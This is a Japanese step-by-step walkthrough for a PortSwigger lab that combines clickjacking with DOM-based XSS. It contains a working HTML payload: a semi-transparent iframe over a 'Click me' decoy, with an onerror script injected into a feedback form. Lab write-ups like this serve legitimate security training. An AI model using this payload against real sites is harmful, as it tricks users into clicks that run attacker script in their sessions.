# クリックジャッキングの脆弱性を悪用して DOM ベースの XSS をトリガーする

次のハッキングラボを実施  
https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss  
このラボには、クリックによって引き起こされる XSS 脆弱性が含まれています。

- 1. BurpSuite を起動して、Proxy タブからブラウザを立ち上げます
- 2. ハッキングラボにアクセスします
- 3. エクスプロイトサーバに移動します
- 4. ボディに以下の内容を入力します

```html
<style>
  iframe {
    position: relative;
    width: 700px;
    height: 600px;
    opacity: 0.5;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 510px;
    left: 80px;
    z-index: 1;
  }
</style>
<div>Click me</div>
<iframe src="https://0a260063044bc36480dcf5c500de003b.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

- 5. 自分の環境でクリックジャッキング出来るように上記の Click me の位置調整を行います
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/60263814-3890-45fe-9f6b-16bd4cde2199)

- 6. Save ボタン押下後に Deliver expoilt to victim ボタンを押下します
